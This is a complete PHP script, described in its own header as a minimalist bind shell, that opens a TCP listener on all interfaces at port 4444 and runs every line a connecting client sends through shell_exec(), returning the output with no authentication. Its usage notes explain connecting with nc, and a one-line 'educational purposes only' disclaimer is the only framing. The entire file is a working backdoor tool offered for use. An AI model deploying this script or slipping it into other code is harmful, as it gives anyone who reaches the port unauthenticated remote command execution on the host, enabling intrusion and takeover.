<?php
/**
 * Minimalist PHP Bind shell CLI TCP Socket Server
 *
 * This script initializes a single-threaded TCP network listener using PHP's low-level 
 * sockets extension. It accepts incoming network connections, reads string data line-by-line, 
 * passes the input to the system's execution layer via shell_exec(), and streams the raw 
 * stdout back to the connected client socket. Includes connection lifecycle safeguards 
 * to handle abrupt client disconnects cleanly.
 *
 * PHP Version: 7.0 or higher (Requires 'sockets' extension enabled)
 *
 * You can adjust $port variable to change the listening port.
 * 
 * Usage:
 * Start the server: php bind_shell.php
 * Connect to the server: nc <ip_address> <port>
 *
 * Disclaimer: This code is for educational purposes only. Use it at your own risk.
 */

$address = '0.0.0.0';
$port = 4444;

$socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
if ($socket === false) {
    die("Error: Could not create socket.\n");
}

socket_set_option($socket, SOL_SOCKET, SO_REUSEADDR, 1);

if (socket_bind($socket, $address, $port) === false) {
    die("Error: Could not bind socket to {$address}:{$port}.\n");
}

socket_listen($socket, 5);
echo "Server listening on {$address}:{$port}...\n";

while (true) {
    $client = socket_accept($socket);
    if ($client === false) {
        continue;
    }
    
    $client_ip = '';
    $client_port = 0;
    socket_getpeername($client, $client_ip, $client_port);
    echo "Connection established from {$client_ip}:{$client_port}\n";
    
    $welcome = "Connected to the PHP bind shell server.\nType your command (or 'exit' to disconnect)\n";
    socket_write($client, $welcome, strlen($welcome));
    
    while (true) {
        $input = socket_read($client, 2048);
        
        if ($input === false || $input === '') {
            break;
        }
        
        $trimmed = trim($input);
        
        if ($trimmed === 'exit') {
            $goodbye = "Goodbye!\n";
            socket_write($client, $goodbye, strlen($goodbye));
            break;
        }
        
        if ($trimmed !== '') {
            $output = shell_exec($trimmed);
            socket_write($client, $output, strlen($output));
        }
    }
    
    echo "Client {$client_ip}:{$client_port} disconnected.\n";
    socket_close($client);
}

socket_close($socket);
?>
